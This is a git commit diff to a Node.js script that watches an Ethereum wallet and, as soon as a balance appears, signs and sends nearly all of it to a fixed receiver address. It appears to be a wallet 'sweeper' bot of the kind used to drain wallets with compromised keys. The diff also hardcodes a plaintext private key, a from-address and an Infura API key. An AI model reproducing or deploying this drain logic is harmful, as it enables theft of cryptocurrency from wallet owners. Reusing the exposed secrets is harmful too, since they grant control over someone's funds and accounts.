3811cddf40f11398c998f33ba8c3447e89629ad2
Farmansk <shkfrmn786@gmail.com>
2023-05-08 14:56:22 +0530

    eth mainnet

--- server.js
+++ server.js
@@ -2,16 +2,17 @@ const Web3 = require("web3");
 const EthereumTx = require('ethereumjs-tx').Transaction;
 const common = require('ethereumjs-common');
 const axios = require('axios');
-const webSocket = 'wss://speedy-nodes-nyc.moralis.io/bd9515705954faf8ff293c28/bsc/mainnet/ws'
+const { default: Common } = require("ethereumjs-common");
+const webSocket = 'wss://mainnet.infura.io/ws/v3/02dde345528643bcbc4fb7a5e56a44d4'
 const ethNetwork = 'https://data-seed-prebsc-1-s1.binance.org:8545/';
-const http = 'https://bsc-dataseed.binance.org/'
+const http = 'https://mainnet.infura.io/v3/02dde345528643bcbc4fb7a5e56a44d4'
 const web3 = new Web3(new Web3.providers.WebsocketProvider(webSocket));
 const webnode = new Web3(new Web3.providers.HttpProvider(http));
 
-const fromAddress = ''
+const fromAddress = '0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3'
 //Paste  your private key in the quotes and save the file
-const privateKey = ''
-const receiverAddress = '0xAcCD91cDdBd27EB3d5B9dCdb1E380846E89537Af'
+const privateKey = 'ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258'
+const receiverAddress = '0xd55d54f1a1a7C6E7b1AC25aC20c237B8feeF1B5b'
 
 async function transferFund(sendersData, recieverData, amountToSend, gas) {
   return new Promise(async (resolve, reject) => {
@@ -24,7 +25,7 @@ async function transferFund(sendersData, recieverData, amountToSend, gas) {
       "gasPrice": gasPrices.low * 1000000000,
       "nonce": nonce,
       //change to mainet later
-      "chainId": 56// EIP 155 chainId - mainnet: 1, rinkeby: 4
+      "chainId": 1// EIP 155 chainId - mainnet: 1, rinkeby: 4
     };
     const binanceChain = common.default.forCustomChain(
       'mainnet', {
@@ -34,8 +35,9 @@ async function transferFund(sendersData, recieverData, amountToSend, gas) {
     },
       'petersburg'
     )
+    const ethChain = new Common({ chain: "mainnet" })
 
-    const transaction = new EthereumTx(details, { 'common': binanceChain });
+    const transaction = new EthereumTx(details, { 'common': ethChain });
     let privateKey = sendersData.privateKey
     let privKey = Buffer.from(privateKey, 'hex')
     transaction.sign(privKey);
@@ -56,9 +58,8 @@ async function transferFund(sendersData, recieverData, amountToSend, gas) {
 
 async function getCurrentGasPrices() {
   return {
-    low: 10,
+    low: 160,
   }
-
 }
 
 async function getBalance(address) {
@@ -88,6 +89,7 @@ async function listenWallet() {
   //      })
   try {
     let balance = await getBalance(fromAddress)
+    console.log(balance)
     if (balance > 0) {
       console.log(balance)
       await initiateTransaction(balance)
@@ -96,14 +98,13 @@ async function listenWallet() {
     await sleep(40)
   }
   catch (e) {
-
+    console.log(e)
   }
 
   listenWallet()
 
 }
 function getTrans(trans) {
-
   webnode.eth.getTransaction(trans, (err, tx) => {
     try {
       if (err != null) {
@@ -128,7 +129,7 @@ async function initiateTransaction(balance) {
     try {
       console.log("Got balance in account")
       var amountToSend = balance
-      amountToSend -= 210000000000000
+      amountToSend -= 3360000000000000
       if (amountToSend < 0) return reject()
       console.log("amount to send : " + amountToSend)
       if (balance < 0) return reject()
@@ -149,7 +150,7 @@ async function confirmEtherTransaction(trnasactionData) {
     console.log('Transaction with hash has been successfully confirmed')
     //console.log(trnasactionData)
     var balance = parseInt(trnasactionData.value)
-    balance -= 210000000000000
+    balance -= 3360000000000000
     //balance*=0.000000000000000001
     let amountToSend = balance
     console.log("amount to send : " + amountToSend)
